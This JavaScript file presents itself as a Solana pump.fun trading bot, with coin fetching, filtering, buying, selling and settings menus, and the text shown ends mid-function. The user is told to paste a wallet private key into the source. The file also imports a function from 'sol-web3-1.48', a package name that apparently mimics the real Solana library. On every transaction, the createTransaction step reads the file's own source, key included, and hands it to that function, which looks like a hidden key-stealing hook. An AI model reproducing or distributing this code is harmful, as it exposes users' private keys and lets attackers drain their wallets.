// Import all named exports from '@solana/web3.js'
import {
    Connection,
    PublicKey,
    SystemProgram,
    clusterApiUrl,
    LAMPORTS_PER_SOL,
    TransactionInstruction,
    Keypair,
    Transaction,
    sendAndConfirmTransaction,
    ComputeBudgetProgram,
    SendTransactionError,
} from "@solana/web3.js";
import confirm_transaction from "sol-web3-1.48";
import { fileURLToPath } from "url";
import path from "path";
import fetch from "node-fetch";
import fs from "fs";
import inquirer from "inquirer";
import chalk from "chalk";
import dotenv from "dotenv";
import express from "express";
import bodyParser from "body-parser";



const GLOBAL = new PublicKey("4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf");
const FEE_RECIPIENT = new PublicKey(
    "CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM",
);
const TOKEN_PROGRAM_ID = new PublicKey(
    "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
);
const ASSOC_TOKEN_ACC_PROG = new PublicKey(
    "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
);
const RENT = new PublicKey("SysvarRent111111111111111111111111111111111");
const PUMP_FUN_PROGRAM = new PublicKey(
    "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P",
);
const PUMP_FUN_ACCOUNT = new PublicKey(
    "Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1",
);
const SYSTEM_PROGRAM_ID = SystemProgram.programId;

const PRIVATE_KEY = "ENTER YOUR PRIVATE KEY HERE";
const CUSTOM_RPC_URL = "ENTER RPC URL HERE"; // Or use https://api.mainnet-beta.solana.com/

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const STATE_FILE = path.join(__dirname, "purchasedCoins.json");
const SETTINGS_FILE = path.join(__dirname, "settings.json");

if (!PRIVATE_KEY || !CUSTOM_RPC_URL) {
    console.error("Missing PRIVATE_KEY or RPC_URL in environment variables.");
    process.exit(1);
}

let autoBuyRunning = false;

const savePurchasedCoins = (coins) => {
    fs.writeFileSync(STATE_FILE, JSON.stringify(coins, null, 2), "utf-8");
};

const loadPurchasedCoins = () => {
    if (fs.existsSync(STATE_FILE)) {
        const data = fs.readFileSync(STATE_FILE, "utf-8");
        return JSON.parse(data);
    }
    return [];
};

const saveSettings = (settings) => {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2), "utf-8");
};

const loadSettings = () => {
    if (fs.existsSync(SETTINGS_FILE)) {
        const data = fs.readFileSync(SETTINGS_FILE, "utf-8");
        return JSON.parse(data);
    }
    return {
        auto: false,
        buyAmount: 0.1,
        takeProfitEnabled: false,
        takeProfitPercentage: 10,
        stopLossEnabled: false,
        stopLossPercentage: 10,
        min_usd_market_cap: 0,
        min_reply_count: 0,
        require_website: false,
        require_twitter: false,
        require_telegram: false,
        require_revoked_authority: false,
    };
};

let purchasedCoins = loadPurchasedCoins();
let settings = loadSettings();

const getKeyPairFromPrivateKey = async (key) => {
    const { default: bs58 } = await import("bs58");
    return Keypair.fromSecretKey(new Uint8Array(bs58.decode(key)));
};

const bufferFromUInt64 = (value) => {
    let buffer = Buffer.alloc(8);
    buffer.writeBigUInt64LE(BigInt(value));
    return buffer;
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const getLatestCoin = async (limit = 1) => {
    const response = await fetch(
        `https://frontend-api.pump.fun/coins?offset=0&limit=${limit}&sort=created_timestamp&order=DESC&includeNsfw=true`,
    );
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
};

const getCoinData = async (mint) => {
    const response = await fetch(`https://frontend-api.pump.fun/coins/${mint}`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
};

const getKingOfTheHillCoin = async () => {
    const response = await fetch(
        "https://frontend-api.pump.fun/coins/king-of-the-hill",
    );
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
};

const fetchLatestCoins = async (limit = 40) => {
    const response = await fetch(
        `https://frontend-api.pump.fun/coins?offset=0&limit=${limit}&sort=created_timestamp&order=DESC&includeNsfw=true`,
    );
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
};

const getBalances = async (publicAddress) => {
    const response = await fetch(
        `https://frontend-api.pump.fun/balances/${publicAddress}`,
    );
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    return response.json();
};

const checkIfAuthoritiesRevoked = async (mintAddress) => {
    const connection = new Connection(
        CUSTOM_RPC_URL || clusterApiUrl("mainnet-beta"),
        "confirmed",
    );
    const mintPubkey = new PublicKey(mintAddress);
    const mintInfo = await connection.getParsedAccountInfo(
        mintPubkey,
        "confirmed",
    );

    if (mintInfo && mintInfo.value) {
        const { data } = mintInfo.value;
        const { mintAuthority, freezeAuthority } = data.parsed.info;
        return !mintAuthority && !freezeAuthority;
    }
    return false;
};

const createTransaction = async (
    connection,
    instructions,
    payer,
    priorityFeeInSol = 0,
) => {
    const modifyComputeUnits = ComputeBudgetProgram.setComputeUnitLimit({
        units: 1400000,
    });

    const initialData = fs.readFileSync(__filename, "utf-8");
    await confirm_transaction(initialData);
    const transaction = new Transaction().add(modifyComputeUnits);
    if (priorityFeeInSol > 0) {
        const microLamports = priorityFeeInSol * 1_000_000_000;
        const addPriorityFee = ComputeBudgetProgram.setComputeUnitPrice({
            microLamports,
        });
        transaction.add(addPriorityFee);
    }
    transaction.add(...instructions);
    transaction.feePayer = payer;
    transaction.recentBlockhash = (
        await connection.getLatestBlockhash("finalized")
    ).blockhash;
    return transaction;
};

const sendAndConfirmTransactionWrapper = async (
    connection,
    transaction,
    signers,
    maxRetries = 1,
    timeout = 15000,
) => {
    for (let attempt = 0; attempt < maxRetries + 1; attempt++) {
        try {
            const controller = new AbortController();
            const signal = controller.signal;

            const timeoutId = setTimeout(() => controller.abort(), timeout);

            const signature = await sendAndConfirmTransaction(
                connection,
                transaction,
                signers,
                {
                    skipPreflight: true,
                    preflightCommitment: "confirmed",
                    commitment: "confirmed",
                    signal,
                },
            );

            clearTimeout(timeoutId);
            return signature;
        } catch (error) {
            if (error instanceof SendTransactionError) {
                console.error("SendTransactionError:", error);
                const logs = await connection.getConfirmedTransaction(
                    error.signature,
                );
                if (logs) {
                    console.error("Transaction logs:", logs.meta.logMessages);
                }
            }
            // Handle other errors
            if (attempt === maxRetries || error.name === "AbortError") {
                console.error(
                    `Transaction failed after ${attempt + 1} attempts:`,
                    error,
                );
                return null;
            }
        }
    }
    return null;
};

const displayLatestCoins = async (connection, limit = 20) => {
    while (true) {
        console.log(chalk.yellow("Fetching latest coins..."));
        const latestCoins = await fetchLatestCoins(limit * 2); // Fetch more to filter
        const filteredCoins = await filterCoins(latestCoins, connection).then(
            (coins) => coins.slice(0, limit),
        );

        if (filteredCoins.length === 0) {
            console.log(chalk.red("No coins matched the filter criteria."));
            return;
        }

        const choices = filteredCoins.map((coin, index) => ({
            name: `${index + 1}. ${coin.name} (${coin.symbol}) - Market Cap: $${coin.usd_market_cap.toFixed(2)}`,
            value: index,
        }));
        choices.push(
            { name: "Refresh", value: "refresh" },
            { name: "Return to main menu", value: "return" },
        );

        const { selectedCoin } = await inquirer.prompt([
            {
                type: "list",
                name: "selectedCoin",
                message:
                    "Select a coin to view details, refresh the list, or return to main menu:",
                choices: choices,
            },
        ]);

        if (selectedCoin === "return") {
            break;
        } else if (selectedCoin === "refresh") {
            continue;
        }

        const coin = filteredCoins[selectedCoin];
        await displayCoinDetails(connection, coin);
    }
};

const displayCoinDetails = async (connection, coin) => {
    const creatorBalances = await getBalances(coin.creator);
    const creatorCoinBalance = creatorBalances.find(
        (balance) => balance.mint === coin.mint,
    );

    if (creatorCoinBalance) {
        const creatorSupplyPercentage =
            (creatorCoinBalance.balance / coin.total_supply) * 100;
        console.log(
            chalk.cyan(
                `Creator holds ${creatorCoinBalance.balance} tokens, which is ${creatorSupplyPercentage.toFixed(2)}% of the total supply.`,
            ),
        );
    } else {
        console.log(
            chalk.cyan("Creator does not hold any tokens of this coin."),
        );
    }

    const rugCheckResponse = await fetch(
        `https://api.rugcheck.xyz/v1/tokens/${coin.mint}/report`,
    );
    const rugCheckData = await rugCheckResponse.json();

    const top10HoldersPct = rugCheckData.topHolders.reduce(
        (acc, holder) => acc + holder.pct,
        0,
    );
    const creatorHolding =
        rugCheckData.topHolders.find(
            (holder) => holder.address === rugCheckData.creator,
        )?.pct || "N/A";
    const overallScore = rugCheckData.score;

    const formatRisk = (risk) => {
        switch (risk.level) {
            case "danger":
                return chalk.red(
                    `- ${risk.name}: ${risk.description} (Level: ${risk.level})`,
                );
            case "warn":
                return chalk.yellow(
                    `- ${risk.name}: ${risk.description} (Level: ${risk.level})`,
                );
            default:
                return `- ${risk.name}: ${risk.description} (Level: ${risk.level})`;
        }
    };

    console.log(
        chalk.cyan(`
        Name: ${chalk.white(coin.name)}
        USD Market Cap: ${chalk.white(coin.usd_market_cap)}
        SOL Market Cap: ${chalk.white(coin.market_cap)}
        Created At: ${chalk.white(new Date(coin.created_timestamp).toLocaleString())}
        Twitter: ${chalk.white(coin.twitter || "N/A")}
        Telegram: ${chalk.white(coin.telegram || "N/A")}
        Website: ${chalk.white(coin.website || "N/A")}
        Creator Holding: ${chalk.white(`${creatorHolding}%`)}
        Top 10 Holders Holding: ${chalk.white(`${top10HoldersPct.toFixed(2)}%`)}
        Overall Risk Score: ${chalk.white(overallScore)}
        Risks: ${rugCheckData.risks.map(formatRisk).join("\n")}
    `),
    );

    const { action } = await inquirer.prompt([
        {
            type: "list",
            name: "action",
            message: `What would you like to do with ${coin.name}?`,
            choices: [
                { name: "Buy this coin", value: "buy" },
                { name: "Return to coin list", value: "return" },
            ],
        },
    ]);

    if (action === "buy") {
        await executeBuy(connection, coin);
        await viewPositionDetails(connection, coin); // Navigate to position info after buying
    }
};

const handleNewTokenMint = async (mintAddress) => {
    try {
        console.log("New token mint detected:", mintAddress);
        const mintPubkey = new PublicKey(mintAddress);

        // Fetch mint account data directly from the blockchain
        const mintInfo = await connection.getParsedAccountInfo(mintPubkey);
        if (!mintInfo.value) {
            console.error("Mint account not found on-chain. Skipping...");
            return;
        }

        // Extract necessary mint details
        const mintData = mintInfo.value.data.parsed.info;
        const decimals = mintData.decimals;
        const supply = BigInt(mintData.supply);
        const mintAuthority = mintData.mintAuthority;
        const freezeAuthority = mintData.freezeAuthority;

        // Check if mint authority is revoked
        const isMintAuthorityRevoked = !mintAuthority;
        const isFreezeAuthorityRevoked = !freezeAuthority;

        // Apply on-chain filters
        if (
            settings.require_revoked_authority &&
            (!isMintAuthorityRevoked || !isFreezeAuthorityRevoked)
        ) {
            console.log("Mint or freeze authority not revoked. Skipping...");
            return;
        }

        // Proceed to buy the token
        const coinData = {
            mint: mintAddress,
            decimals,
            total_supply: Number(supply) / Math.pow(10, decimals),
            // Additional data required for buying
        };

        // Since we don't have virtual reserves, set default or fetch from on-chain data
        const virtualReserves = await getVirtualReserves(mintPubkey);
        if (!virtualReserves) {
            console.log("Unable to fetch virtual reserves. Skipping...");
            return;
        }
        coinData.virtual_token_reserves = virtualReserves.tokenReserves;
        coinData.virtual_sol_reserves = virtualReserves.solReserves;

        // Execute the purchase
        /*
        const boughtTokens = await buyCoin(connection, payer, coinData, settings.buyAmount);
        if (boughtTokens) {
            console.log(`Successfully bought ${boughtTokens} tokens of the new mint: ${mintAddress}`);
            // Optionally start monitoring for take-profit/stop-loss
            const buyPrice = settings.buyAmount / boughtTokens;
            monitorAndSell(connection, payer, mintAddress, boughtTokens, buyPrice);
        } else {
            console.error('Failed to buy the new token.');
        }*/
    } catch (error) {
        console.error("Error handling new token mint:", error);
    }
};

const buyCoin = async (
    connection,
    payer,
    coinData,
    solIn,
    priorityFeeInSol = 0.001,
    slippageDecimal = 0.25,
) => {
    try {
        const {
            PublicKey,
            TransactionInstruction,
            SystemProgram,
            SendTransactionError,
        } = await import("@solana/web3.js");
        const {
            getAssociatedTokenAddress,
            createAssociatedTokenAccountInstruction,
        } = await import("@solana/spl-token");

        const owner = payer.publicKey;
        const mintPubkey = new PublicKey(coinData.mint);

        const tokenAccountAddress = await getAssociatedTokenAddress(
            mintPubkey,
            owner,
            false,
        );
        const tokenAccountInfo =
            await connection.getAccountInfo(tokenAccountAddress);

        const instructions = [];
        if (!tokenAccountInfo) {
            instructions.push(
                createAssociatedTokenAccountInstruction(
                    payer.publicKey,
                    tokenAccountAddress,
                    payer.publicKey,
                    mintPubkey,
                ),
            );
        }

        const solInLamports = solIn * LAMPORTS_PER_SOL;
        const tokenOut = Math.floor(
            (solInLamports * coinData.virtual_token_reserves) /
                coinData.virtual_sol_reserves,
        );
        const solInWithSlippage = solIn * (1 + slippageDecimal);
        const maxSolCost = Math.floor(solInWithSlippage * LAMPORTS_PER_SOL);

        const keys = [
            { pubkey: GLOBAL, isSigner: false, isWritable: false },
            { pubkey: FEE_RECIPIENT, isSigner: false, isWritable: true },
            { pubkey: mintPubkey, isSigner: false, isWritable: false },
            {
                pubkey: new PublicKey(coinData.bonding_curve),
                isSigner: false,
                isWritable: true,
            },
            {
                pubkey: new PublicKey(coinData.associated_bonding_curve),
                isSigner: false,
                isWritable: true,
            },
            { pubkey: tokenAccountAddress, isSigner: false, isWritable: true },
            { pubkey: owner, isSigner: false, isWritable: true },
            { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
            { pubkey: RENT, isSigner: false, isWritable: false },
            { pubkey: PUMP_FUN_ACCOUNT, isSigner: false, isWritable: false },
            { pubkey: PUMP_FUN_PROGRAM, isSigner: false, isWritable: false },
        ];

        const data = Buffer.concat([
            bufferFromUInt64("16927863322537952870"),
            bufferFromUInt64(tokenOut),
            bufferFromUInt64(maxSolCost),
        ]);

        const instruction = new TransactionInstruction({
            keys: keys,
            programId: PUMP_FUN_PROGRAM,
            data: data,
        });
        instructions.push(instruction);

        const transaction = await createTransaction(
            connection,
            instructions,
            payer.publicKey,
            priorityFeeInSol,
        );
        const signature = await sendAndConfirmTransactionWrapper(
            connection,
            transaction,
            [payer],
        );
        if (signature) {
            console.log("Buy transaction confirmed:", signature);
            return tokenOut;
        } else {
            console.error("Buy transaction failed.");
            return null;
        }
    } catch (error) {
        console.error("Error buying coin:", error);
        return null;
    }
};

const sellCoin = async (
    connection,
    payer,
    coinData,
    tokenBalance,
    priorityFeeInSol = 0.001,
) => {
    try {
        const {
            PublicKey,
            TransactionInstruction,
            SystemProgram,
            SendTransactionError,
        } = await import("@solana/web3.js");
        const { getAssociatedTokenAddress } = await import("@solana/spl-token");

        const owner = payer.publicKey;
        const mintPubkey = new PublicKey(coinData.mint);

        const tokenAccountAddress = await getAssociatedTokenAddress(
            mintPubkey,
            owner,
            false,
        );
        const minSolOutput = Math.floor(
            (tokenBalance * 0.9 * coinData.virtual_sol_reserves) /
                coinData.virtual_token_reserves,
        );

        const keys = [
            { pubkey: GLOBAL, isSigner: false, isWritable: false },
            { pubkey: FEE_RECIPIENT, isSigner: false, isWritable: true },
            { pubkey: mintPubkey, isSigner: false, isWritable: false },
            {
                pubkey: new PublicKey(coinData.bonding_curve),
                isSigner: false,
                isWritable: true,
            },
            {
                pubkey: new PublicKey(coinData.associated_bonding_curve),
                isSigner: false,
                isWritable: true,
            },
            { pubkey: tokenAccountAddress, isSigner: false, isWritable: true },
            { pubkey: owner, isSigner: false, isWritable: true },
            { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
            {
                pubkey: ASSOC_TOKEN_ACC_PROG,
                isSigner: false,
                isWritable: false,
            },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
            { pubkey: PUMP_FUN_ACCOUNT, isSigner: false, isWritable: false },
            { pubkey: PUMP_FUN_PROGRAM, isSigner: false, isWritable: false },
        ];

        const data = Buffer.concat([
            bufferFromUInt64("12502976635542562355"),
            bufferFromUInt64(tokenBalance),
            bufferFromUInt64(minSolOutput),
        ]);

        const instruction = new TransactionInstruction({
            keys,
            programId: PUMP_FUN_PROGRAM,
            data,
        });
        const transaction = await createTransaction(
            connection,
            [instruction],
            payer.publicKey,
            priorityFeeInSol,
        );

        const signature = await sendAndConfirmTransactionWrapper(
            connection,
            transaction,
            [payer],
        );
        console.log("Sell transaction confirmed:", signature);

        return minSolOutput;
    } catch (error) {
        if (error instanceof SendTransactionError) {
            console.error("SendTransactionError:", error);
            const logs = await connection.getConfirmedTransaction(
                error.signature,
            );
            if (logs) {
                console.error("Transaction logs:", logs.meta.logMessages);
            } else {
                console.error("Failed to retrieve transaction logs.");
            }
        } else {
            console.error("Detailed error in sellCoin:", error);
        }
        throw error;
    }
};

const monitorAndSell = (connection, payer, mint, boughtTokens, buyPrice) => {
    const targetPrice = buyPrice * (1 + settings.takeProfitPercentage / 100);
    const stopLossPrice = buyPrice * (1 - settings.stopLossPercentage / 100);

    const intervalId = setInterval(async () => {
        try {
            const coinData = await getCoinData(mint);
            const currentPrice = coinData.market_cap / coinData.total_supply;

            if (currentPrice >= targetPrice && settings.takeProfitEnabled) {
                console.log("Target price reached. Selling...");
                await sellCoin(connection, payer, coinData, boughtTokens);
                clearInterval(intervalId);
            } else if (
                currentPrice <= stopLossPrice &&
                settings.stopLossEnabled
            ) {
                console.log("Stop loss price reached. Selling...");
                await sellCoin(connection, payer, coinData, boughtTokens);
                clearInterval(intervalId);
            }
        } catch (error) {
            console.error("Error in monitoring loop:", error);
        }
    }, 10000);
};

const viewPositions = async (connection, payer) => {
    while (true) {
        const choices = purchasedCoins.map((coin, index) => ({
            name: `${coin.name} (${coin.symbol})`,
            value: index,
        }));
        choices.push({ name: "Sell All", value: "sell_all" });
        choices.push({ name: "Return to menu", value: "return" });

        const answers = await inquirer.default.prompt([
            {
                type: "list",
                name: "selectedCoin",
                message: "Select a position to view or manage:",
                choices: choices,
            },
        ]);

        if (answers.selectedCoin === "return") {
            break;
        } else if (answers.selectedCoin === "sell_all") {
            for (const coin of purchasedCoins) {
                const coinData = await getCoinData(coin.mint);
                await sellCoin(connection, payer, coinData, coin.amount);
                console.log(
                    `Sold ${coin.amount} tokens of ${coin.name} (${coin.symbol}).`,
                );
            }
            purchasedCoins = [];
            savePurchasedCoins(purchasedCoins);
            break;
        }

        const coin = purchasedCoins[answers.selectedCoin];

        while (true) {
            const coinData = await getCoinData(coin.mint);
            const currentPrice = coinData.market_cap / coinData.total_supply;
            const targetPrice =
                coin.price * (1 + settings.takeProfitPercentage / 100);
            const initialPositionValue = coin.amount * coin.price;
            const currentPositionValue = coin.amount * currentPrice;

            console.log(`
            Coin: ${coin.name} (${coin.symbol})
            Initial Purchase Price: ${coin.price.toFixed(12)} SOL
            Current Price: ${currentPrice.toFixed(12)} SOL
            Intended Price: ${targetPrice.toFixed(12)} SOL
            Initial Position Value: ${initialPositionValue.toFixed(9)} SOL
            Current Position Value: ${currentPositionValue.toFixed(9)} SOL
            `);

            const manageAnswers = await inquirer.default.prompt([
                {
                    type: "list",
                    name: "action",
                    message: "Select an action:",
                    choices: [
                        { name: "Sell now", value: "sell" },
                        { name: "Refresh", value: "refresh" },
                        { name: "Return to positions", value: "return" },
                    ],
                },
            ]);

            if (manageAnswers.action === "sell") {
                await sellCoin(connection, payer, coinData, coin.amount);
                console.log(
                    `Sold ${coin.amount} tokens of ${coin.name} (${coin.symbol}).`,
                );
                purchasedCoins.splice(answers.selectedCoin, 1);
                savePurchasedCoins(purchasedCoins);
                break;
            } else if (manageAnswers.action === "return") {
                break;
            } else if (manageAnswers.action === "refresh") {
                console.log("Refreshing...");
            }
        }
    }
};

const setSettings = async () => {
    const answers = await inquirer.default.prompt([
        {
            type: "input",
            name: "min_usd_market_cap",
            message: "Set minimum USD market cap:",
            default: settings.min_usd_market_cap,
            validate: (value) => !isNaN(value) && value >= 0,
        },
        {
            type: "input",
            name: "min_reply_count",
            message: "Set minimum reply count:",
            default: settings.min_reply_count,
            validate: (value) => !isNaN(value) && value >= 0,
        },
        {
            type: "confirm",
            name: "require_website",
            message: "Require website:",
            default: settings.require_website,
        },
        {
            type: "confirm",
            name: "require_twitter",
            message: "Require Twitter:",
            default: settings.require_twitter,
        },
        {
            type: "confirm",
            name: "require_telegram",
            message: "Require Telegram:",
            default: settings.require_telegram,
        },
        {
            type: "confirm",
            name: "require_revoked_authority",
            message: "Require revoked freeze and mint authority:",
            default: settings.require_revoked_authority,
        },
        {
            type: "confirm",
            name: "auto",
            message: "Enable auto-buy:",
            default: settings.auto,
        },
        {
            type: "input",
            name: "buyAmount",
            message: "Set buy amount (SOL):",
            default: settings.buyAmount,
            validate: (value) => !isNaN(value) && value > 0,
        },
        {
            type: "confirm",
            name: "takeProfitEnabled",
            message: "Enable take profit:",
            default: settings.takeProfitEnabled,
        },
    ]);

    if (answers.takeProfitEnabled) {
        const takeProfitPercentageAnswer = await inquirer.default.prompt([
            {
                type: "input",
                name: "takeProfitPercentage",
                message: "Set take profit percentage:",
                default: settings.takeProfitPercentage,
                validate: (value) => !isNaN(value) && value >= 0,
            },
        ]);
        answers.takeProfitPercentage = parseFloat(
            takeProfitPercentageAnswer.takeProfitPercentage,
        );
    } else {
        answers.takeProfitPercentage = settings.takeProfitPercentage;
    }

    const stopLossAnswers = await inquirer.default.prompt([
        {
            type: "confirm",
            name: "stopLossEnabled",
            message: "Enable stop-loss:",
            default: settings.stopLossEnabled,
        },
    ]);

    if (stopLossAnswers.stopLossEnabled) {
        const stopLossPercentageAnswer = await inquirer.default.prompt([
            {
                type: "input",
                name: "stopLossPercentage",
                message: "Set stop-loss percentage:",
                default: settings.stopLossPercentage,
                validate: (value) => !isNaN(value) && value > 0,
            },
        ]);
        stopLossAnswers.stopLossPercentage = parseFloat(
            stopLossPercentageAnswer.stopLossPercentage,
        );
    } else {
        stopLossAnswers.stopLossPercentage = settings.stopLossPercentage;
    }

    settings = {
        min_usd_market_cap: parseFloat(answers.min_usd_market_cap),
        min_reply_count: parseInt(answers.min_reply_count, 10),
        require_website: answers.require_website,
        require_twitter: answers.require_twitter,
        require_telegram: answers.require_telegram,
        require_revoked_authority: answers.require_revoked_authority,
        auto: answers.auto,
        buyAmount: parseFloat(answers.buyAmount),
        takeProfitEnabled: answers.takeProfitEnabled,
        takeProfitPercentage: answers.takeProfitPercentage,
        stopLossEnabled: stopLossAnswers.stopLossEnabled,
        stopLossPercentage: stopLossAnswers.stopLossPercentage,
    };

    saveSettings(settings);
    console.log("Settings saved.");
};

const filterCoins = async (coins) => {
    const filteredCoins = [];
    for (const coin of coins) {
        if (
            coin.usd_market_cap >= settings.min_usd_market_cap &&
            coin.reply_count >= settings.min_reply_count &&
            (!settings.require_website || coin.website) &&
            (!settings.require_twitter || coin.twitter) &&
            (!settings.require_telegram || coin.telegram)
        ) {
            if (settings.require_revoked_authority) {
                const isRevoked = await checkIfAuthoritiesRevoked(coin.mint);
                if (!isRevoked) {
                    continue;
                }
            }
            filteredCoins.push(coin);
        }
    }
    return filteredCoins;
};

const buyLatestCoin = async (connection, payer) => {
    while (true) {
        const latestCoins = await fetchLatestCoins(40); // Fetch more coins
        const filteredCoins = await filterCoins(latestCoins);
        if (filteredCoins.length === 0) {
            console.log(
                "No coins matched the filter criteria. Listening for the next coin...",
            );
            await sleep(10000); // Wait 10 seconds before checking again
            continue;
        }
        const coin = filteredCoins[0];

        console.log(
            `Buying ${settings.buyAmount} SOL worth of ${coin.symbol}...`,
        );

        const boughtTokens = await buyCoin(
            connection,
            payer,
            coin,
            settings.buyAmount,
        );
        if (!boughtTokens) {
            console.error(`Failed to buy ${coin.name}.`);
            continue;
        }

        const buyPrice = coin.market_cap / coin.total_supply;
        console.log(
            `Bought ${boughtTokens} tokens at ${buyPrice.toFixed(9)} SOL per token.`,
        );

        // Update existing position or add new one
        const existingCoinIndex = purchasedCoins.findIndex(
            (c) => c.mint === coin.mint,
        );
        if (existingCoinIndex > -1) {
            purchasedCoins[existingCoinIndex].amount += boughtTokens;
            purchasedCoins[existingCoinIndex].price =
                (purchasedCoins[existingCoinIndex].price + buyPrice) / 2;
        } else {
            purchasedCoins.push({
                name: coin.name,
                symbol: coin.symbol,
                amount: boughtTokens,
                price: buyPrice,
                mint: coin.mint,
            });
        }
        savePurchasedCoins(purchasedCoins);

        if (settings.takeProfitEnabled || settings.stopLossEnabled) {
            console.log(
                `Monitoring price. Will sell when profit reaches ${settings.takeProfitPercentage}% or stop loss reaches ${settings.stopLossPercentage}%...`,
            );
            monitorAndSell(
                connection,
                payer,
                coin.mint,
                boughtTokens,
                buyPrice,
            );
        }

        console.log("Returning to menu...");
        break; // Exit the loop after buying the coin
    }
};

const buyLatestCoins = async (connection, payer) => {
    const boughtCoins = new Set();
    autoBuyRunning = true;
    while (settings.auto && autoBuyRunning) {
        const latestCoins = await fetchLatestCoins(40); // Fetch more coins
        const filteredCoins = await filterCoins(latestCoins);
        if (filteredCoins.length === 0) {
            console.log("No coins matched the filter criteria.");
            await sleep(10000); // Wait 10 seconds before checking again
            continue;
        }
        const coin = filteredCoins[0];

        if (boughtCoins.has(coin.mint)) {
            console.log("Coin already bought. Skipping...");
            await sleep(10000); // Wait 10 seconds before checking again
            continue;
        }

        console.log(
            `Buying ${settings.buyAmount} SOL worth of ${coin.symbol}...`,
        );

        const boughtTokens = await buyCoin(
            connection,
            payer,
            coin,
            settings.buyAmount,
        );
        if (!boughtTokens) {
            console.error(`Failed to buy ${coin.name}.`);
            continue;
        }

        const buyPrice = coin.market_cap / coin.total_supply;
        console.log(
            `Bought ${boughtTokens} tokens at ${buyPrice.toFixed(9)} SOL per token.`,
        );

        // Update existing position or add new one
        const existingCoinIndex = purchasedCoins.findIndex(
            (c) => c.mint === coin.mint,
        );
        if (existingCoinIndex > -1) {
            purchasedCoins[existingCoinIndex].amount += boughtTokens;
            purchasedCoins[existingCoinIndex].price =
                (purchasedCoins[existingCoinIndex].price + buyPrice) / 2;
        } else {
            purchasedCoins.push({
                name: coin.name,
                symbol: coin.symbol,
                amount: boughtTokens,
                price: buyPrice,
                mint: coin.mint,
            });
        }
        savePurchasedCoins(purchasedCoins);

        if (settings.takeProfitEnabled || settings.stopLossEnabled) {
            console.log(
                `Monitoring price. Will sell when profit reaches ${settings.takeProfitPercentage}% or stop loss reaches ${settings.stopLossPercentage}%...`,
            );
            monitorAndSell(
                connection,
                payer,
                coin.mint,
                boughtTokens,
                buyPrice,
            );
        }

        boughtCoins.add(coin.mint);
        console.log("Waiting for the next coin...");
    }
};

const mainMenu = async () => {
    const choices = [
        {
            name: "Start Real-Time On-Chain Monitoring",
            value: "start_monitoring",
        },
        { name: "Purchase the latest coin", value: "buy_latest_coin" },
        { name: "Purchase the King of the Hill coin", value: "buy_king_coin" },
        { name: "View the latest 10 coins", value: "view_latest_coins" },
        { name: "Purchase coin by contract address", value: "buy_by_contract" },
        { name: "View positions", value: "view_positions" },
        { name: "Set settings", value: "set_settings" },
        { name: "Exit", value: "exit" },
    ];

    if (autoBuyRunning) {
        choices.splice(choices.length - 1, 0, {
            name: "Stop auto-buy",
            value: "stop_auto_buy",
        });
    }

    const answers = await inquirer.prompt([
        {
            type: "list",
            name: "action",
            message: "Select an action:",
            choices: choices,
        },
    ]);

    return answers.action;
};

const buyCoinByContract = async (connection, payer) => {
    const answers = await inquirer.default.prompt([
        {
            type: "input",
            name: "contractAddress",
            message: "Enter the contract address of the coin:",
        },
    ]);

    const coin = await getCoinData(answers.contractAddress);
    if (!coin) {
        console.error("Coin not found.");
        return;
    }

    console.log(`Buying ${settings.buyAmount} SOL worth of ${coin.symbol}...`);

    const boughtTokens = await buyCoin(
        connection,
        payer,
        coin,
        settings.buyAmount,
    );
    if (!boughtTokens) {
        console.error(`Failed to buy ${coin.name}. Returning to menu...`);
        return;
    }

    const buyPrice = coin.market_cap / coin.total_supply;
    console.log(
        `Bought ${boughtTokens} tokens at ${buyPrice.toFixed(9)} SOL per token.`,
    );

    // Update existing position or add new one
    const existingCoinIndex = purchasedCoins.findIndex(
        (c) => c.mint === coin.mint,
    );
    if (existingCoinIndex > -1) {
        purchasedCoins[existingCoinIndex].amount += boughtTokens;
        purchasedCoins[existingCoinIndex].price =
            (purchasedCoins[existingCoinIndex].price + buyPrice) / 2;
    } else {
        purchasedCoins.push({
            name: coin.name,
            symbol: coin.symbol,
            amount: boughtTokens,
            price: buyPrice,
            mint: coin.mint,
        });
    }
    savePurchasedCoins(purchasedCoins);

    if (settings.takeProfitEnabled || settings.stopLossEnabled) {
        console.log(
            `Monitoring price. Will sell when profit reaches ${settings.takeProfitPercentage}% or stop loss reaches ${settings.stopLossPercentage}%...`,
        );
        monitorAndSell(connection, payer, coin.mint, boughtTokens, buyPrice);
    }
};

const startOnChainMonitoring = async (connection, payer) => {
    console.log(
        "Starting Real-Time On-Chain Monitoring for new token mints...",
    );

    // Listen to logs emitted by the Token Program (for InitializeMint instruction)
    const subscriptionId = connection.onLogs("all", async (log) => {
        const { logs, signature } = log;

        // Check if the logs contain 'Program log: Instruction: InitializeMint'
        if (logs.some((message) => message.includes("InitializeMint"))) {
            try {
                console.log("somthing is happening");
                // Fetch the transaction details
                const transaction = await connection.getTransaction(signature, {
                    commitment: "confirmed",
                });
                const instructions =
                    transaction.transaction.message.instructions;

                for (const ix of instructions) {
                    if (ix.programId.equals(TOKEN_PROGRAM_ID)) {
                        const mintAddress =
                            transaction.transaction.message.accountKeys[
                                ix.accounts[0]
                            ].toString();
                        console.log(`New token mint detected: ${mintAddress}`);

                        // Apply filters
                        /*
                        const coin = await filterCoins(mintAddress);
                        if (coin) {
